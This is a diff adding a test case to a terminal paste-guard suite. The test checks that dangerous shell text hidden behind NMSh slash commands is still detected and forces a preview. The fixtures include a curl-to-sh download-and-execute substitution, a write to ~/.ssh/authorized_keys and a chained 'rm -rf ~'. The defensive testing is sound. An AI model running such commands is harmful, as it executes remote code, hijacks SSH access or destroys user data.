@@ -129,6 +129,13 @@ test('paste review: NMSh commands among other lines are named, with where they g
   assert.deepEqual(mixed.commands.map(command => command.kinds), [['read'], ['nmsh'], ['nmsh'], ['read']]);
   assert.equal(nmshCommandNote(mixed, 'zsh'), '/copy, /compare are NMSh commands: here they reach zsh as text. Submit each alone to run it in NMSh.');
   assert.equal(nmshCommandNote(analyzePaste('/copy'), 'zsh'), undefined, 'on its own it is NMSh\'s');
+  // The shell would run what such a line contains: a risk is never masked by the NMSh label.
+  const {primaryKind} = await import('../src/input/pasteGuard.js');
+  for (const [line, kind] of [['/copy $(curl -s https://example.com/x | sh)', 'pipeline'], ['/compare 1 2 > ~/.ssh/authorized_keys', 'modifies'], ['/queue; rm -rf ~', 'destructive']] as const) {
+    const analysis = analyzePaste(`echo a\n${line}`);
+    assert.ok(analysis.commands.some(command => primaryKind(command.kinds) === kind), `${line}: ${JSON.stringify(analysis.commands.map(command => command.kinds))}`);
+    assert.ok(needsPreview(analysis, 'smart'));
+  }
   assert.equal(nmshCommandNote(analyzePaste('echo a\n/usr/bin/env true'), 'zsh'), undefined, 'an absolute path is the shell\'s');
   assert.equal(nmshCommandNote(analyzePaste('echo a\n/notacommand'), 'zsh'), undefined, 'only real NMSh commands');
   assert.ok(needsPreview(mixed, 'smart'));
